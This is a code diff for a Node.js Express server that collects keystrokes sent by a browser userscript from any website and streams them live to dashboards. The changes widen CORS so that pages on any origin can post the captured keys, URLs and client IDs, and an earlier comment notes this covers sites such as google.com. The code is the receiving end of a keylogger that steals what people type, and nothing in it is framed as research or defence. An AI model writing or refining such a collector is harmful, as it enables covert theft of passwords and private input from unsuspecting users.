@@ -3,23 +3,28 @@ const cors = require('cors');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware — FIXED CORS HERE
+// FIXED CORS: Allow all origins without credentials
 app.use(cors({
-  origin: '*',  // ← THIS ALLOWS ALL SITES (including google.com)
-  methods: ['GET', 'POST', 'OPTIONS'],  // ← ADDED OPTIONS FOR PREFLIGHT
-  allowedHeaders: ['Content-Type']  // ← ALLOWS JSON
+  origin: '*',  // Wildcard OK since no credentials
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type'],
+  credentials: false  // ← KEY FIX: No credentials mode
 }));
-app.use(express.json({ limit: '10mb' })); // big payloads safe
+app.use(express.json({ limit: '10mb' }));
 
-// In-memory broadcast (all open dashboards get live updates)
+// Explicit OPTIONS handler for preflight
+app.options('/log', cors());  // ← ADDED FOR PREFLIGHT
+
+// In-memory broadcast
 const clients = new Set();
 
-// ---------- SSE Stream (Dashboard connects here) ----------
+// SSE Stream
 app.get('/stream', (req, res) => {
   res.setHeader('Content-Type', 'text/event-stream');
   res.setHeader('Cache-Control', 'no-cache');
   res.setHeader('Connection', 'keep-alive');
-  res.setHeader('Access-Control-Allow-Origin', '*');  // ← CORS FOR SSE
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.flushHeaders();
 
   const send = (data) => {
@@ -27,7 +32,6 @@ app.get('/stream', (req, res) => {
   };
   clients.add(send);
 
-  // Ping every 15s to keep Render free tier awake
   const keepAlive = setInterval(() => res.write('data: ping\n\n'), 15000);
 
   req.on('close', () => {
@@ -36,7 +40,7 @@ app.get('/stream', (req, res) => {
   });
 });
 
-// ---------- POST /log (Your UserScript hits this) ----------
+// POST /log
 app.post('/log', (req, res) => {
   const payload = {
     url: req.body.url || "unknown",
@@ -48,7 +52,6 @@ app.post('/log', (req, res) => {
 
   console.log(`[LIVE] ${payload.client} → ${payload.url} → ${payload.keys.join('')}`);
 
-  // Broadcast to ALL open dashboards instantly
   clients.forEach(send => send(payload));
 
   res.json({ status: "ok" });
@@ -56,8 +59,8 @@ app.post('/log', (req, res) => {
 
 // Health check
 app.get('/', (req, res) => res.send('Tracker Server Live'));
+app.get('/log', (req, res) => res.json({ message: "Use POST /log to send data." }));
 
 app.listen(PORT, () => {
-  console.log(`Server running → https://fs-tracker-online.onrender.com`);
-  console.log(`Dashboard → https://fs-tracker-online.onrender.com`);
+  console.log(`Server running on port ${PORT}`);
 });
